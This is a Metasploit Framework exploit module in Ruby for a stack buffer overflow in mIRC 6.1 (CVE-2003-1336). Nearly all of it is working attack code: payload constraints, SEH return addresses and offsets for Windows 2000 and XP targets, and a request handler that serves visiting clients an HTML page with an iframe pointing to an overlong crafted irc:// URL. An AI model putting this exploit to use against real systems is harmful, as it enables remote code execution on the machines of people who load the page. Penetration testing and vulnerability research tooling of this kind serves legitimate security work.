##
# $Id: mirc_irc_url.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'mIRC IRC URL Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in mIRC 6.1. By
				submitting an overly long and specially crafted URL to
				the 'irc' protocol, an attacker can overwrite the buffer
				and control program execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'MC',
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2003-1336'],
					[ 'OSVDB', '2665'],
					[ 'BID', '8819' ],
				],

			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},

			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro English All',   { 'Offset' => 1442, 'Ret' => 0x75022ac4 } ],
					[ 'Windows XP Pro SP0/SP1 English', { 'Offset' => 1414, 'Ret' => 0x71aa32ad } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 13 2003',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		filler =  rand_text_alphanumeric(target['Offset'], payload_badchars)
		seh    = generate_seh_payload(target.ret)
		sploit = filler + seh

		# Build the HTML content
		content = "<html><iframe src='irc://#{sploit}'></html>"

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
